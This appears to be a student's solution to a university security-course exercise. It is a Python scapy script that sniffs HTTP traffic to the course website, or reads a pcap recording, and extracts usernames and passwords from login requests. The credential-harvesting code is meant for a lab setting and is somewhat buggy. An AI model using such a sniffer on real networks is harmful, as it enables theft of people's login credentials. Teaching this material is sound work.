import scapy.all as S
import urlparse
import socket


WEBSITE = 'infosec17.cs.tau.ac.il'


def parse_packet(packet):
	"""
	If this is a login request to the course website, return the username
	and password as a tuple => ('123456789', 'opensesame'). Otherwise,
	return None.

	Note: You can assume the entire HTTP request fits within one packet.
	"""
	# Parse the param field of the raw data and split it with respect to '&'
	# to seperate the username and password from the rest.
	print(packet)
	parsed_data = [x for x in urlparse.urlparse(packet[S.Raw].load).params.split('&')]

	# Search for the 'username' and 'password' in the param field and if they are found
	# split the string with respect to '=' to seperate the label from the content.
	for field in parsed_data:
		if field.find('username') != -1:
			username = field.split('=')[1]
		elif field.find('password') != -1:
			password = field.split('=')[1]
	
	return (username, password)
	


def packet_filter(packet):
	"""
	Filter to keep only HTTP traffic (port 80) from the client to the server.
	"""
	# Verify destination address.
	print(packet[S.TCP])
	if packet.dst == socket.gethostbyname(WEBSITE):
		# Verify TCP protoco
		if S.TCP in packet:
			# Verify port number
			if packet[S.TCP].dport == 80:
				return True
	return False


def main(args):
	# WARNING: DO NOT EDIT THIS FUNCTION!
	if '--help' in args:
		print 'Usage: %s [<path/to/recording.pcap>]' % args[0]

	elif len(args) < 2:
		# Sniff packets and apply our logic.
		S.sniff(lfilter=packet_filter, prn=parse_packet)

	else:
		# Else read the packets from a file and apply the same logic.
		for packet in S.rdpcap(args[1]):
			if packet_filter(packet):
				print parse_packet(packet)


if __name__ == '__main__':
	import sys
	print(socket.gethostbyname(WEBSITE))
	main(sys.argv)
